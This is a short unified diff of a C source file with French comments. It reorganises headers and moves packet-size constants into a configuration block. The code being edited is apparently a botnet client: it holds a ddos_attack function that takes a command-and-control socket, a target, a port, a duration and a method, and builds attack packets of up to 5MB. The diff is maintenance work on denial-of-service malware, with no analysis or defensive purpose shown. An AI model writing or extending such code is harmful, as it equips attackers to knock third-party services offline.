@@ -4,12 +4,20 @@
 #define _BSD_SOURCE
 #define __USE_MISC
 
+/* Configuration */
+#define BUFFER_SIZE 1024
+#define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
+#define MIN_PACKET_SIZE (1024)             // 1KB min
+
+/* Headers système */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/wait.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
@@ -19,7 +27,6 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
-#include <sys/time.h>
 #include <time.h>
 #include <fcntl.h>
 #include <sys/wait.h>
@@ -219,11 +226,7 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
     int sock;
     char message[BUFFER_SIZE];
 
-    // Configuration des paquets d'attaque
-    #define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
-    #define MIN_PACKET_SIZE (1024)             // 1KB min
-    
-    // Essayer d'allouer avec différentes tailles
+    // Tailles des paquets pour les attaques
     int packet_sizes[] = {MAX_PACKET_SIZE, 512*1024, 64*1024, MIN_PACKET_SIZE};
     int packet_size = 0;
     char* attack_packet = NULL;
